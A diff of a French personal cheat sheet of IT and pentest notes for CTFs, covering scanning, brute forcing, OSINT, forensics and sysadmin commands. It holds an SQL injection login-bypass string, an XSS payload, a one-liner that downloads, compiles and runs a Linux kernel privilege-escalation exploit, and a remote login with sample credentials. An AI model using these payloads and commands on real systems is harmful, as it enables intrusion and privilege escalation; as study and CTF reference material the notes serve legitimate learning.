@@ -2,6 +2,8 @@
 
 > Le but de ce document est de regrouper les différents informations à propos de l'IT dans un seul repository accessible de partout
 
+---
+
 ## CTF
 
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
@@ -31,6 +33,8 @@
 
 - Biblothèque cyber --> https://inventory.raw.pm/tools.html#title-tools-threat-intelligence
 
+---
+
 ### Payload
 
 - ' or 1=1- - --> Bypass authentification web
@@ -49,7 +53,9 @@
 
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
 	- `<iframe src="javascript:alert('xss')">`
-	
+
+---
+ 
 ## BruteForce
 ### Hydra
 
@@ -72,23 +78,15 @@ john zip.hashes`
 
  - Crack hash Windows --> `john --format=krb5asrep hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
 
+---
 	
 ## Scan
-
 ### Passif 
 
 - Nslookup/dig
 - TheHarvester (énumération DNS) --> `theHarvester -d mokoil.com -e 8.8.8.8 -c -n`
 
 - Table ARP
-
-#### OSINT
-
-- [EPIOS](https://epieos.com/)
-- [Shodan](https://www.shodan.io/)
-- [Onyphe](https://www.onyphe.io/)
-- [GreyNoise](https://viz.greynoise.io/)
-- https://dorkgpt.com/
 
 ### Actif 
 - Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
@@ -105,12 +103,14 @@ john zip.hashes`
 
 - WAF --> `wafw00f http://rainbowstore2.chall.malicecyber.com/ `
 
-## Directory
+#### Directory
 
 - Gobuster --> `gobuster dir -u http://10.10.96.122 -w /usr/share/wordlists/dirb/common.txt`
 - Dirb --> `dirb http://mypage.com`
 	- Chercher des extensions --> `dirb http://172.16.28.230/ -X .txt .php`
 - Fuzz --> `ffuf -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -ac -v -u http://172.16.28.230/FUZZ -recursion -r`
+
+---
 
 ## Linux - Commande
 
@@ -168,11 +168,13 @@ iface enp0s3 inet static
 - Récupérer les fichiers d'unn dossiers sur Internet : `wget -r -np -nH --cut-dirs=2 https://archive.apache.org/dist/tomcat/tomcat-6/`
 
 
-## Bash - Linux
+### Bash - Linux
 
 - Récupérer le X caratères d'une string --> `cut -c 8-19`
 
 - Récupérer les X derniers caratères d'une string --> `tail  -c 6`
+
+---
 
 ## Windows - Commande
 
@@ -188,8 +190,9 @@ iface enp0s3 inet static
 
 - `ipconfig /displaydns | find X` --> voir les recherches DNS
 
-## Malware
+---
 
+## Malware
 ### Tools
 
 - [Virus Total](https://www.virustotal.com/gui/home/upload) --> étudier un fichier
@@ -203,7 +206,7 @@ iface enp0s3 inet static
 - [GTFObins](https://gtfobins.github.io/) (liste de binaires vulnérables avec POC)
 	- Lister les SUIDS --> `find / -perm /4000 2>/dev/null`
 
- - Boite a outils RedTeam --> https://arttoolkit.github.io/
+ - Boite à outils RedTeam --> https://arttoolkit.github.io/
 
 - [USB Payload](https://github-wiki-see.page/m/hak5darren/USB-Rubber-Ducky/wiki/Payloads) (liste payloads pour attaque via USB)
 
@@ -216,7 +219,6 @@ iface enp0s3 inet static
 - Kernel exploit --> `wget https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.10.0-28-generic/CVE-2017-16995/CVE-2017-16995.c && gcc CVE-2017–16995.c -o CVE-2017–16995 && ./CVE-2017-16995`
 
 - Analyser un mail --> https://mailheader.org/
-
 
 ### Windows 
 
@@ -237,6 +239,8 @@ iface enp0s3 inet static
 - Connexion sur la machine cliente --> `evil-winrm -i 10.129.118.175 -u svc-alfresco -p s3rvice`
 
 - Ressources pentest AD --> https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
+
+---
 
 ## Forensics
 
@@ -263,6 +267,8 @@ iface enp0s3 inet static
    	- [NetworkMinor](https://www.netresec.com/?page=NetworkMiner)
    	- https://github.com/Srinivas11789/PcapXray
 
+---
+
 ## OSINT
 
 - [Script G-Hunt](https://github.com/mxrch/GHunt) --> Rassemble les informations à partir d'une adresse mail google
@@ -284,6 +290,14 @@ iface enp0s3 inet static
 - https://facecheck.id/ --> Recherche par visage
 
 - Framework --> https://osintframework.com/
+
+- [EPIOS](https://epieos.com/)
+- [Shodan](https://www.shodan.io/)
+- [Onyphe](https://www.onyphe.io/)
+- [GreyNoise](https://viz.greynoise.io/)
+- https://dorkgpt.com/
+
+---
 
 ## Photo
 
@@ -309,6 +323,8 @@ iface enp0s3 inet static
 
 - Enlever le background --> https://www.remove.bg/
 
+---
+
 ## Dessin
 
 - [Tldraw](https://www.tldraw.com/) --> faire des shcémas
@@ -328,6 +344,8 @@ iface enp0s3 inet static
 
 - [ufile](https://ufile.io/) --> Dépôt de fichier 5 Go
 
+---
+
 ## Other
 
 - Barrier --> permet d'avoir plusieurs PC sur 1 PC
@@ -342,6 +360,8 @@ iface enp0s3 inet static
 - partage de fichier via Tor --> [OnionShare](https://github.com/onionshare/onionshare)
 
 - Find movie --> `"Titre du film" -inurl(html|htm|php|txt) intitle: index.of "last modified" (mp4|avi)`
+
+---
 
 ## Admin Sys
 
@@ -383,6 +403,8 @@ iface enp0s3 inet static
 - Stopper tout les docker en même temps --> `sudo docker stop $(sudo docker ps -aq)`
 
 - Trouver les derniers fichiers écrits sur le système : `sudo find / \( -path /proc -o -path /sys \) -prune -o -type f -printf "%T@ %p\n" | sort -n | tail -n 50`
+
+---
 
 ## Hardening
 
